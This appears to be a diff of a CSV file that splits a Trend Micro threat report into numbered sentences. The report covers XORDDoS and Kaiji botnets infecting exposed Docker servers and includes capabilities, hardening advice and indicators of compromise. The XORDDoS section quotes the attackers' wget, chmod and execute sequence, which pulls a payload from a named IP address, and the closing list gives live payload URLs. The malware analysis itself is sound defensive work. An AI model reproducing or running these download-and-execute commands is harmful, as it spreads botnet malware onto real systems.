@@ -1,128 +1,133 @@
 Number,Content
-Sentence 1,"xorddos, kaiji variants target exposed docker servers
-we detected variants of two linux botnet malware - xorddos and kaiji - targeting exposed docker servers."
-Sentence 2,"xorddos infiltrated the docker server to infect all containers it hosts, while the kaiji attack used its own container with its ddos malware."
-Sentence 3,"by: augusto remillano ii, patrick noel collado, karen ivy titiwa
-june 22, 2020
-read time: 4 min (981 words)
+Sentence 1,"XORDDoS, Kaiji Variants Target Exposed Docker Servers
+We detected variants of two Linux botnet malware - XORDDoS and Kaiji - targeting exposed Docker servers."
+Sentence 2,"XORDDoS infiltrated the Docker server to infect all containers it hosts, while the Kaiji attack used its own container with its DDoS malware."
+Sentence 3,"By: Augusto Remillano II, Patrick Noel Collado, Karen Ivy Titiwa
+June 22, 2020
+Read time: 4 min (981 words)
 
-subscribe
+Subscribe
 "
 Sentence 4,"
-we have recently detected variants of two existing linux botnet malware types targeting exposed docker servers; these are xorddos malware (detected by trend micro as backdoor.linux.xorddos.ae) and kaiji ddos malware (detected by trend micro as ddos.linux.kaiji.a)."
-Sentence 5,"having docker servers as their target is a new development for both xorddos and kaiji; xorddos was known for targeting linux hosts on cloud systems, while recently discovered kaiji was first reported to affect internet of things (iot) devices."
-Sentence 6,attackers usually used botnets to perform brute-force attacks after scanning for open secure shell (ssh) and telnet ports.
-Sentence 7,"now, they also searched for docker servers with exposed ports (2375)."
-Sentence 8,"port 2375, one of the two ports docker api uses, is for unencrypted and unauthenticated communication."
-Sentence 9,"there is, however, a notable difference between the two malware variants’ method of attack."
-Sentence 10,"while the xorddos attack infiltrated the docker server to infect all the containers hosted on it, the kaiji attack deploys its own container that will house its ddos malware."
-Sentence 11,"these malware variants facilitate distributed denial of service (ddos), a type of attack designed to disable, disrupt, or shut down a network, website, or service."
-Sentence 12,this is done by using multiple systems to overwhelm the target system with traffic until it becomes inaccessible to other users.
-Sentence 13,"analysis of xorddos malware
-the xorddos infection started with the attackers searching for hosts with exposed docker api ports (2375)."
-Sentence 14,they then sent a command that listed the containers hosted on the docker server.
-Sentence 15,"afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:
+We have recently detected variants of two existing Linux botnet malware types targeting exposed Docker servers; these are XORDDoS malware (detected by Trend Micro as Backdoor.Linux.XORDDOS.AE) and Kaiji DDoS malware (detected by Trend Micro as DDoS.Linux.KAIJI.A)."
+Sentence 5,"Having Docker servers as their target is a new development for both XORDDoS and Kaiji; XORDDoS was known for targeting Linux hosts on cloud systems, while recently discovered Kaiji was first reported to affect internet of things (IoT) devices."
+Sentence 6,Attackers usually used botnets to perform brute-force attacks after scanning for open Secure Shell (SSH) and Telnet ports.
+Sentence 7,"Now, they also searched for Docker servers with exposed ports (2375)."
+Sentence 8,"Port 2375, one of the two ports Docker API uses, is for unencrypted and unauthenticated communication."
+Sentence 9,"There is, however, a notable difference between the two malware variants’ method of attack."
+Sentence 10,"While the XORDDoS attack infiltrated the Docker server to infect all the containers hosted on it, the Kaiji attack deploys its own container that will house its DDoS malware."
+Sentence 11,"These malware variants facilitate distributed denial of service (DDoS), a type of attack designed to disable, disrupt, or shut down a network, website, or service."
+Sentence 12,This is done by using multiple systems to overwhelm the target system with traffic until it becomes inaccessible to other users.
+Sentence 13,"Analysis of XORDDoS malware
+The XORDDoS infection started with the attackers searching for hosts with exposed Docker API ports (2375)."
+Sentence 14,They then sent a command that listed the containers hosted on the Docker server.
+Sentence 15,"Afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the XORDDoS malware:
 
-wget http://122.51.133.49:10086/vip –o vip
-chmod 777 vip
-./vip
-the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server."
-Sentence 16,it also created multiple copies of itself inside the machine as a persistence mechanism.
-Sentence 17,"figure 1. code snippet showing xorddos creating multiple copies of itself
+wget http://122.51.133.49:10086/VIP –O VIP
+chmod 777 VIP
+./VIP
+The XORDDoS payload (detected by Trend Micro as Backdoor.Linux.XORDDOS.AE) still used the XOR-key it used in other recorded attacks, BB2FA36AAA9541F0, to encrypt its strings and to communicate with the command and control (C&C) server."
+Sentence 16,It also created multiple copies of itself inside the machine as a persistence mechanism.
+Sentence 17,Figure 1.
+Sentence 18,"Code snippet showing XORDDoS creating multiple copies of itself
 "
-Sentence 18,"
+Sentence 19,"
 
-the payload initiated syn, ack, and dns types of ddos attacks."
-Sentence 19,"figure 2. code snippet showing the types of ddos attack that xorddos can launch
+The payload initiated SYN, ACK, and DNS types of DDoS attacks."
+Sentence 20,Figure 2.
+Sentence 21,"Code snippet showing the types of DDoS attack that XORDDoS can launch
 "
-Sentence 20,"
+Sentence 22,"
 
-it is also capable of downloading and executing a follow-up malware, or updating itself."
-Sentence 21,figure 3. code snippet showing xorddos’ capability to download and update files.
-Sentence 22,
-Sentence 23,"
+It is also capable of downloading and executing a follow-up malware, or updating itself."
+Sentence 23,Figure 3.
+Sentence 24,Code snippet showing XORDDoS’ capability to download and update files.
+Sentence 25,"
 
-it gathered the following data, which are relevant to its attempt to initiate a ddos attack:
+It gathered the following data, which are relevant to its attempt to initiate a DDoS attack:
 
-cpu information
-md5 of running process
-memory information
-network speed
-pid of running process
-it should be noted that most of the behaviors exhibited by this particular xorddos variant have already been observed in earlier variants of the malware."
-Sentence 24,"upon further investigation of the url linked to the attacker, we found other malware such as backdoor.linux.dofloo.ab, a variant of dofloo/aesddos linux botnet malware that we witnessed  targeting exposed docker apis previously."
-Sentence 25,"analysis of kaiji malware
-similar with the xorddos malware, kaiji is now also targeting exposed docker servers for propagation."
-Sentence 26,"its operator also scanned the internet for hosts with exposed port 2375. after finding a target, they pinged the docker server before deploying a rogue arm container that executed the kaiji binary."
-Sentence 27,"the script 123.sh (detected by trend micro as trojan.sh.kaiji.a) downloaded and executed the malware payload, linux_arm (detected by trend micro as ddos.linux.kaiji.a)."
-Sentence 28,"afterwards, the script also removed other linux binaries that are basic components of the operating system but are not necessary for its ddos operation."
-Sentence 29,"figure 4. query that downloads and executes 123.sh
+CPU Information
+MD5 of Running Process
+Memory Information
+Network Speed
+PID of Running Process
+It should be noted that most of the behaviors exhibited by this particular XORDDoS variant have already been observed in earlier variants of the malware."
+Sentence 26,"Upon further investigation of the URL linked to the attacker, we found other malware such as Backdoor.Linux.DOFLOO.AB, a variant of Dofloo/AESDDoS Linux botnet malware that we witnessed  targeting exposed Docker APIs previously."
+Sentence 27,"Analysis of Kaiji malware
+Similar with the XORDDoS malware, Kaiji is now also targeting exposed Docker servers for propagation."
+Sentence 28,Its operator also scanned the internet for hosts with exposed port 2375.
+Sentence 29,"After finding a target, they pinged the Docker server before deploying a rogue ARM container that executed the Kaiji binary."
+Sentence 30,"The script 123.sh (detected by Trend Micro as Trojan.SH.KAIJI.A) downloaded and executed the malware payload, linux_arm (detected by Trend Micro as DDoS.Linux.KAIJI.A)."
+Sentence 31,"Afterwards, the script also removed other Linux binaries that are basic components of the operating system but are not necessary for its DDoS operation."
+Sentence 32,Figure 4.
+Sentence 33,"Query that downloads and executes 123.sh
 "
-Sentence 30,"
+Sentence 34,"
 
-figure 5. code snippet showing the removal of linux binaries
+Figure 5."
+Sentence 35,"Code snippet showing the removal of Linux binaries
 "
-Sentence 31,"
+Sentence 36,"
 
-the payload linux_arm, which is the kaiji ddos malware, initiated the following ddos attacks:
+The payload linux_arm, which is the Kaiji DDoS malware, initiated the following DDoS attacks:
 
-ack attack
-ips spoof attack
-ssh attack
-syn attack
-synack attack
-tcp flood attack
-udp flood attack
-this malware also gathered the following data, which it can use for the aforementioned attacks:
+ACK attack
+IPS spoof attack
+SSH attack
+SYN attack
+SYNACK attack
+TCP flood attack
+UDP flood attack
+This malware also gathered the following data, which it can use for the aforementioned attacks:
 
-cpu information
-directories
-domain name
-host ip address
-pid of running process
-url scheme
-defending docker servers
-as seen in these findings, threat actors behind malware variants constantly upgrade their creations with new capabilities so that they can deploy their attacks against other entry points."
-Sentence 32,"as they are relatively convenient to deploy in the cloud, docker servers are becoming an increasingly popular option for companies."
-Sentence 33,"however, these also make them an attractive target for cybercriminals who are on the constant lookout for systems that they can exploit."
-Sentence 34,"these are some recommendations for securing docker servers:
+CPU Information
+Directories
+Domain Name
+Host IP address
+PID of Running Process
+URL scheme
+Defending Docker servers
+As seen in these findings, threat actors behind malware variants constantly upgrade their creations with new capabilities so that they can deploy their attacks against other entry points."
+Sentence 37,"As they are relatively convenient to deploy in the cloud, Docker servers are becoming an increasingly popular option for companies."
+Sentence 38,"However, these also make them an attractive target for cybercriminals who are on the constant lookout for systems that they can exploit."
+Sentence 39,"These are some recommendations for securing Docker servers:
 
-secure the container host."
-Sentence 35,"take advantage of monitoring tools, and host containers in a container-focused os."
-Sentence 36,secure the networking environment.
-Sentence 37,use intrusion prevention system (ips) and web filtering to provide visibility and observe internal and external traffic.
-Sentence 38,secure the management stack.
-Sentence 39,monitor and secure the container registry and lock down the kubernetes installation.
-Sentence 40,secure the build pipeline.
-Sentence 41,implement a thorough and consistent access control scheme and install strong endpoint controls.
-Sentence 42,adhere to the recommended best practices.
-Sentence 43,use security tools to scan and secure containers.
-Sentence 44,security solutions are recommended for safeguarding docker servers.
-Sentence 45,"trend micro™ hybrid cloud security is recommended for automated security and protection for physical, virtual, and cloud workloads."
-Sentence 46,"this solution encompasses the following:
+Secure the container host."
+Sentence 40,"Take advantage of monitoring tools, and host containers in a container-focused OS."
+Sentence 41,Secure the networking environment.
+Sentence 42,Use intrusion prevention system (IPS) and web filtering to provide visibility and observe internal and external traffic.
+Sentence 43,Secure the management stack.
+Sentence 44,Monitor and secure the container registry and lock down the Kubernetes installation.
+Sentence 45,Secure the build pipeline.
+Sentence 46,Implement a thorough and consistent access control scheme and install strong endpoint controls.
+Sentence 47,Adhere to the recommended best practices.
+Sentence 48,Use security tools to scan and secure containers.
+Sentence 49,Security solutions are recommended for safeguarding Docker servers.
+Sentence 50,"Trend Micro™ Hybrid Cloud Security is recommended for automated security and protection for physical, virtual, and cloud workloads."
+Sentence 51,"This solution encompasses the following:
 
-trend micro cloud one™– for comprehensive visibility and protection against threats
-trend micro cloud one - container security– for automated container image and registry scanning that helps detect threats early on
-trend micro cloud one – workload security – for protecting new and existing workloads against even unknown threats using techniques such as machine learning and virtual patching
-for security as software: trend micro deep security™ software (workload and container security) and trend micro deep security smart check (container image security) for scanning container images and preventing further compromise
+Trend Micro Cloud One™– for comprehensive visibility and protection against threats
+Trend Micro Cloud One - Container Security– for automated container image and registry scanning that helps detect threats early on
+Trend Micro Cloud One – Workload Security – for protecting new and existing workloads against even unknown threats using techniques such as machine learning and virtual patching
+For security as software: Trend Micro Deep Security™ Software (workload and container security) and Trend Micro Deep Security Smart Check (container image security) for scanning container images and preventing further compromise
 "
-Sentence 47,"
-indicators of compromise
-kaiji
+Sentence 52,"
+Indicators of Compromise
+Kaiji
 
-file name	sha 256	trend micro pattern detection
-123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.a
-linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.a
-related urls:
+File name	SHA 256	Trend Micro pattern detection
+123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	Trojan.SH.KAIJI.A
+linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	DDoS.Linux.KAIJI.A
+Related URLs:
 
 http://62.171.160.189/linux_arm
 http://62.171.160.189/11/123.sh
-xorddos and other malware variants found through the same url
+XORDDoS and other malware variants found through the same URL
 
-sha 256	trend micro pattern detection
-dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae
-6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab
-286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.a
-related url:
+SHA 256	Trend Micro pattern detection
+dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	Backdoor.Linux.XORDDOS.AE
+6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	Backdoor.Linux.DOFLOO.AB
+286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	Backdoor.Win32.SDDOS.A
+Related URL:
 
-http://122.51.133.49:10086/vip"
+http://122.51.133.49:10086/VIP"
